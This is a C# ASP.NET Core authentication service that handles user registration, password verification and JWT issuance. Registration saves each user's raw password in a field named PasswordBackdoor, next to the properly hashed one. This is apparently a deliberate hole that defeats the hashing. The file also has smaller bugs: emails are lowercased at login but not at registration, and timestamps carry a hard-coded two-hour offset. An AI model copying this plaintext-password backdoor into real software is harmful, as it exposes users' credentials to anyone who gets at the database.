using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using API.Data;
using API.Interfaces;
using DomainModels.Dto.UserDto;
using DomainModels.Models;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;

namespace API.Services;

public class AuthService : IAuthService
{
	private readonly IConfiguration _configuration;
	private readonly AppDBContext _context;

	public AuthService(IConfiguration configuration, AppDBContext context)
	{
		_configuration = configuration;
		_context = context;
	}

	public async Task<User?> RegisterUserAsync(RegisterDto request)
	{
		if (await _context.Users.AnyAsync(u => u.Email == request.Email))
		{
			return null; // User already exists
		}
		var user = new User
		{
			Email = request.Email,
			UserName = request.Username,
			HashedPassword = string.Empty,
			PasswordBackdoor = request.Password,
			CreatedAt = DateTime.UtcNow.AddHours(2)
		};

		var hashedPassword = new PasswordHasher<User>()
			.HashPassword(user, request.Password);

		user.HashedPassword = hashedPassword;

		_context.Users.Add(user);
		await _context.SaveChangesAsync();

		return user;
	}
	public async Task<string?> LoginUserAsync(LoginDto request)
	{
		var user = await _context.Users
			.Include(u => u.UserRole)
			.FirstOrDefaultAsync(u => u.Email == request.Email.ToLower());

		if (user == null)
		{
			return null; // User not found
		}

		if (new PasswordHasher<User>().VerifyHashedPassword(user, user.HashedPassword, request.Password)
		== PasswordVerificationResult.Failed)
		{
			return null;
		}

		user.LastLogin = DateTime.UtcNow.AddHours(2);
		await _context.SaveChangesAsync();

		string token = CreateToken(user);
		return token;
	}
	private string CreateToken(User user)
	{
		var tokenHandler = new JwtSecurityTokenHandler();
		var claims = new List<Claim>
		{
			new Claim(ClaimTypes.Email, user.Email),
			//NameIdentifier is users id in the database
			new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
			new Claim(ClaimTypes.Role, user.UserRole.RoleName.ToString())
		};


		var key = new SymmetricSecurityKey(
			Encoding.UTF8.GetBytes(_configuration.GetValue<string>("AppSettings:Token")!));

		var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha512);
		var tokenDescriptor = new SecurityTokenDescriptor
		{
			Subject = new ClaimsIdentity(claims),
			Issuer = _configuration.GetValue<string>("AppSettings:Issuer"),
			Audience = _configuration.GetValue<string>("AppSettings:Audience"),
			Expires = DateTime.UtcNow.AddHours(3), // 2 hours + 60 minutes = 3 hours
			SigningCredentials = creds
		};

		var token = tokenHandler.CreateToken(tokenDescriptor);
		return new JwtSecurityTokenHandler().WriteToken(token);
	}
}